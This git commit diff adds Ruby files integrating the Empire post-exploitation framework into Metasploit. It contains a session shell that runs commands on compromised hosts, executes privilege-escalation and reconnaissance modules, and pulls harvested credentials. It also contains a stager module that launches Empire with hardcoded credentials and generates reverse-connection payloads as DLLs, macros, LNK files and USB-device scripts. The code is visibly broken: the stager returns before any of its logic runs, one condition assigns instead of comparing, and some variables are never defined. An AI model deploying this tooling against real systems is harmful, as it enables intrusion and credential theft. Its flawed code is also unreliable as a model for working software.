995c813a57532e6f7e9f8f1bb313eb061f808712
ManasMahapatra <Chirag301212@gmail.com>
2018-06-20 11:01:27 +0530

    Add files via upload
    Add files via upload
    
    Add files via upload
    
    Delete empire.rb
    
    Delete empire_reverse_tcp.rb
    
    Add files via upload
    
    Delete empire_lib.rb
    Commiting final changes
    
    Commiting all changes

---
+++ lib/msf/base/sessions/empire.rb
@@ -0,0 +1,215 @@
+# -*- coding: binary -*-
+require 'msf/ui/console/command_dispatcher.rb'
+require 'msf/base/sessions/command_shell'
+require 'rex/text/table.rb'
+require 'msf/base'
+require 'msf/core/session/interactive.rb'
+
+module Msf
+module Sessions
+
+class EmpireShell < Msf::Sessions::CommandShell
+  include Msf::Session
+  include Rex::Ui::Text::DispatcherShell::CommandDispatcher
+  include Msf::Session::Interactive
+
+  @client_emp = ''
+  @agent_name = ''
+
+  attr_accessor :max_threads
+  attr_accessor :platform
+  attr_accessor :arch
+  attr_accessor :alive
+
+  def desc
+    "Empire Shell #{self.platform}"
+  end
+
+  def interactive?
+    true
+  end
+
+  def self.type
+    "Empire"
+  end
+
+  def framework
+
+  end
+
+  def sid
+
+  end
+
+  def name
+    @agent_name
+  end
+
+  def initialize(emp_object, agent_name)
+    self.platform ||= ""
+    self.max_threads ||= 1
+    self.arch ||= ""
+
+    #Defining instance parameters
+    @client_emp = emp_object
+    @agent_name = agent_name
+  end
+
+  def alive?
+    return self.alive
+  end
+
+
+  #list of available commands
+  def commands
+    {
+      'help'        => 'Show help menu',
+      'show_modules'=> 'List all the Empire post modules available to deploy against the target',
+      'search'      => 'Fetch all the modules resembling to your search term',
+      'show_info'   => 'Displays all the available options and description of the specified module',
+      'use_module'  => 'Attemps to run the specified module against the current agent',
+      'shell'       => 'Run shell commands on target system',
+      'result'      => 'Fetch stored results from the Empire Database',
+      'credentials' => 'Fetch all the saved credentials in the Empire Database',
+      'rename_agent'=> 'Rename the curret agent name for easier interaction',
+      'agentinfo'   => 'Fetch basic information about the agent and host machine'
+    }
+  end
+
+  #
+  #HELP METHODS
+  #------------------
+  #
+  def cmd_help
+    help_table = Rex::Text::Table.new(
+      'Header'        => 'Empire Shell Commands',
+      'HeaderIndent'  => 4,
+      'Prefix'        => '\n',
+      'Postfix'       => '\n',
+      'Coloumns'      => ['Commands','Descriptions'],
+      'Indent'        => 6,
+      'SortIndex'     => -1
+    )
+    commands.each do |command, description|
+      help_table << [command, description]
+    end
+    print(help_table.to_s)
+  end
+
+  #Defining a help method to display command helps.
+  def get_help(usage, example, desc)
+    print_line "Usage : #{usage}"
+    print_line "Example : #{example}"
+    print_line
+    print_line "#{desc}"
+    print_line
+  end
+  #
+  #COMMAND METHODS
+  #----------------------
+  #
+  #Defining show_info command
+  def cmd_show_info(*args)
+    if args.length.zero? || args[0] == '-h' or args[0] == 'help'
+      return get_help("show_info <module_name>","show_info powershell/situational_awareness/network/powerview/find_gpo_location","Displays all the available options and description of the specified modules")
+    else
+      module_name = args[0]
+      @client_emp.info_module(module_name)
+    end
+  end
+
+  #Defining use_module command
+  def cmd_use_module(*args)
+    if args.length.zero? || args[0] == '-h' or args[0] == 'help'
+      return get_help("use_module <module_name>","use_module powershell/situational_awareness/network/powerview/find_gpo_location","Attempts to run the specified module against the current agent")
+    else
+      module_name = args[0]
+      @client_emp.exec_module(module_name, @agent_name)
+    end
+  end
+
+  #Defining search command
+  def cmd_search(*args)
+    if args.length.zero? || args[0] == '-h' or args[0] == 'help'
+      return get_help("search <key_term>","search privesc","Fetch all the modules resembling to your key term")
+    else
+      keyterm = args[0].to_s
+      @client_emp.search_module(keyterm)
+    end
+  end
+
+  #Defining show_modules command
+  def cmd_show_modules
+    @client_emp.get_modules
+  end
+
+  #Defining empire shell command
+  def cmd_shell(*args)
+    if args.length = 1
+      command = args[0]
+      puts @client_emp.exec_command(@agent_name, command)
+    elsif args.length > 1
+      command = args.join(" ")
+      puts @client_emp.exec_command(@agent_name, command)
+    elsif args.length.zero? || args[0] == '-h' or args[0] == 'help'
+      return get_help("shell <shell_command>","shell start notepad.exe","Runs a shell command in target host and stores the result in Empire Database. Please wait few moments before fetching the results, for results to be properly populated")
+    end
+  end
+
+  #Defining results command
+  def results(*args)
+    if args.length.zero? || args[0] == '-h' or args[0] == 'help'
+      return get_help("results <taskID_of_the_action>","results 9","Fetch the respective results of a task from the Empire Database")
+    else
+      taskID = args[0]
+      puts @client_emp.get_results(@agent_name, taskID)
+    end
+  end
+
+  #Defining the credentials command
+  def credentials
+    @client_emp.get_creds
+  end
+
+  #Defining agentinfo command
+  def cmd_agentinfo
+    @client_emp.agent_details(@agent_name)
+  end
+
+  #Defining rename_agent command
+  def cmd_rename_agent(*args)
+    if args.length.zero? || args[0] == '-h' or args[0] == 'help'
+      return get_help("rename <new_name>","rename target_1","Renames the current aget for easier future reference")
+    else
+      new_name = args[0].to_s
+      @client_emp.rename_agent(@agent_name,new_name)
+      name(new_name)
+    end
+  end
+end
+
+class EmpireShellWindows < EmpireShell
+  def initialize(emp_object, agent_name)
+    self.platform = "Windows"
+    @agent_name = agent_name
+    super
+  end
+end
+
+class EmpireShellLinux < EmpireShell
+  def initialize(emp_object, agent_name)
+    self.platform = "Linux"
+    @agent_name = agent_name
+    super
+  end
+end
+
+class EmpireShellOsx < EmpireShell
+  def initialize(emp_object, agent_name)
+    self.platform = "OSX"
+    @agent_name = agent_name
+    super
+  end
+end
+end
+end
---
+++ modules/payloads/stagers/windows/empire_reverse_tcp.rb
@@ -0,0 +1,125 @@
+# This file is part of the Metasploit Framework and may be subject to
+# redistribution and commercial restrictions. Please see theMetasploit
+# web site for more information on licensing and terms of use.
+# http://metasploit.com/
+require 'msf/core/handler/empire_reverse_tcp.rb'
+require 'msf/core/module/data_store'
+require 'msf/core/module/options'
+require 'msf/core/empire_lib.rb'
+
+module MetasploitModule
+  include Msf::Empire
+  include Msf::Module::Options
+  include Msf::Module::DataStore
+  include Msf::Payload::Stager
+  def initialize(info={})
+    super(merge_info(info,
+    'Name'       => 'Empire Stager Module',
+    'Description'=> 'This creates a standalone stager for Empire using the Rest-API',
+    'Author'     => ['author_name'],
+    'License'    => MSF_LICENSE,
+    'Platform'   => ['Windows', 'Linux', 'MacOS'],
+    'Arch'       => ARCH_X86,
+    'Handler'    => Msf::Handler::EmpireReverseTcp
+    ))
+    register_options(
+      [OptAddress.new(
+        'LHOST',
+        [true,
+        'The local address to lisen on'
+        ]),
+      OptPort.new(
+        'LPORT',
+        [true,
+        'The local port to listen on'
+        ]),
+      OptString.new(
+        'ListenerName',
+        [true,
+        'The empire listener name that would listen for the created stager on the local system',
+        ]),
+      OptEnum.new(
+        'StagerType',
+        [true,
+        'The type of stager to be generated',
+        enums: ['windows/dll', 'windows/ducky', 'windows/launcher_sct', 'windows/laucher_vbs', 'windows/launcher_xml', 'windows/teensy', 'windows/launcher_bat', 'windows/launcher_lnk', 'windows/macro' ]]),
+      OptString.new(
+        'PathToEmpire',
+        [true,
+        'The complete path to Empire-WEB API',
+        '/'])
+    ])
+  end
+  def payload_name(stager)
+    @rand_no = rand(1..10000)
+    case stager
+      when "windows/dll"
+        return "/tmp/launcher#{@rand_no}.dll"
+      when "windows/launcher_bat"
+        return "/tmp/launcher#{@rand_no}.bat"
+      when "windows/launcher_vbs"
+        return "/tmp/launcher#{@rand_no}.vbs"
+      when "windows/launcher_sct"
+        return "/tmp/launcher#{@rand_no}.sct"
+      when "windows/launcher_lnk"
+        return "/tmp/launcher#{@rand_no}.lnk"
+      when "windows/launcher_xml"
+        return "/tmp/launcher#{@rand_no}.xml"
+      when "windows/teensy"
+        return "/tmp/launcher#{@rand_no}.ino"
+      when "windows/macro"
+        return "/tmp/macro#{@rand_no}.txt"
+      when "multi/pyinstaller"
+        return "/tmp/launcher#{@rand_no}.elf"
+      when "multi/war"
+        return "/tmp/launcher#{@rand_no}.war"
+    end
+  end
+  def generate
+    return ""
+    #
+    #Storing data from user
+    #
+    host = datastore['LHOST'].to_s
+    port = datastore['LPORT'].to_s
+    listener_name = datastore['ListenerName'].to_s
+    stager_type = datastore['StagerType'].to_s
+    path = datastore['PathToEmpire'].to_s
+    command = "cd #{path}  && ./empire --headless --username 'msf-empire' --password 'msf-empire' > /dev/null"
+    #
+    #Initiating the Empire API Instance thread with provided username and password
+    #
+    print_status("Initiating Empire Web-API")
+    server = Thread.new{
+      value = system(command)
+    }
+    #
+    #Creating an Empire object
+    #
+    client = Msf::Empire::Client.new(user_name, user_pass)
+    #
+    #Checking if listener aleady exists
+    #
+    if client.is_listener_active(listener_name) == false
+      response = client.create_listener(listener_name, port, host)
+      raise response.to_s if response.to_s.include?("Failed")
+      print_status(response.to_s)
+      #Creating the stager
+      payload_path = payload_name(stager_type)
+      print_status(client.gen_stager(listener_name, stager_type, payload_path))
+    else
+      print_status(client.is_listener_active(listener_name))
+    end
+    #
+    #Shutting down API
+    #
+    client.shutdown()
+    #Showing user the respective listener to use while for handling reverse connection
+    #
+    print_status("Use Listener:#{listener_name} to listen for the created stager")
+    #
+    #Terminating the thread
+    #
+    server.terminate
+  end
+end
